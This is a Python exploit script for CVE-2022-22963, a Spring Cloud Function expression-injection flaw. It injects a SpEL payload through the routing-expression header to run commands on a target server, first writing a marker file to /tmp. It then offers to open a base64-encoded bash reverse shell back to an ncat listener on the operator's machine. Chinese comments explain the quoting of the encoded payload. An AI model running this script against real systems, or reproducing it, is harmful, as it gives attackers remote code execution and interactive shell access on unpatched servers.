import requests
import sys,socket,time,os
import argparse

from threading import Thread
import base64

def ncat_listener()->None:
    os.system("ncat -lvnp 9999")

def exp(url = str,payload = str):
    url = url + '/functionRouter'
    payload = f'T(java.lang.Runtime).getRuntime().exec("{payload}")'
    #payload = 'T(java.lang.Runtime).getRuntime().exec("{payload}")'.format(payload)
    data = "1"
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding":"gzip, deflate",
        "Accept-Language":"en,zh-CN;q=0.9,zh;q=0.8",
        "Connection":"close",
        "Content-Type":"text/plain",
        "Content-Length":"1",
        "spring.cloud.function.routing-expression":payload
    }
    return requests.post(url,data,headers=headers,verify=False,timeout=5)

def vul(code = int ,text = str)->bool:
    check = "Internal Server Error"
    if code == 500 or check in text:
        print(f"[+] {args.url} is vulnerable\n")
        return True
    else:
        print(f"[-] {args.url} is not vulnerable\n")
        return False

if __name__ == "__main__":
    arg = argparse.ArgumentParser()
    arg.add_argument("-u","--url",dest="url",help="python3 file.py -u http://example.com:8080")
    args = arg.parse_args()

    if args.url is None:
        arg.print_help()
        sys.exit(1)

    print(f"[+] target {args.url}\n")
    print(f"Check if {args.url} is vulnerable to CVE-2022-22963...\n")

    response = exp(args.url,"touch /tmp/success")
    if vul(response.status_code,response.text):
        check = input("[/] Reverse Shell? [y/n]")
        if check in {"y","Y"}:
            R_shell = Thread(target=ncat_listener)
            R_shell.start()
            time.sleep(1)
            Attacker_ip = input("[+] Your IP: ")
            payload = f"bash -i >& /dev/tcp/{Attacker_ip}/9999 0>&1"
            # 直接在bash中运行需要 bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}" 加双引号
            # GPT4 解释：
            # 当在命令行直接运行这个bash命令时，我们需要在 -c 参数后面的命令字符串用引号（"）包裹起来，
            # 是因为这个命令包含了特殊字符（如空格、括号等）。而引号（"）能够确保这个命令被bash作为一个整体来解析和执行。
            # 然而，当我们将这个命令作为一个payload发送到目标机器上执行时，就不需要这个引号了。这是因为这个payload已经被当作一个字符串在网络上发送了，
            # 目标机器接收到这个payload后，会将其作为一个整体来处理和执行，而不会像命令行一样需要拆解和解析命令中的各个部分。
            # 至于为什么在payload中包含引号会导致反弹shell失败，这可能是因为引号在网络传输中被转义，
            # 或者目标机器在接收payload时对引号进行了特殊处理，导致bash不能正确解析和执行这个包含引号的payload。
            # 总的来说，当你在命令行直接执行bash命令时，需要用引号包裹 -c 参数后的命令；而当你将bash命令作为payload发送时，则不需要这个引号。
            payload = 'bash -c {echo,'+str(base64.b64encode(payload.encode())).strip('b').strip("'")+'}|{base64,-d}|{bash,-i}'
            
            exp(args.url,payload)
        else:
            sys.exit(1)
    else:
        sys.exit(1)
             

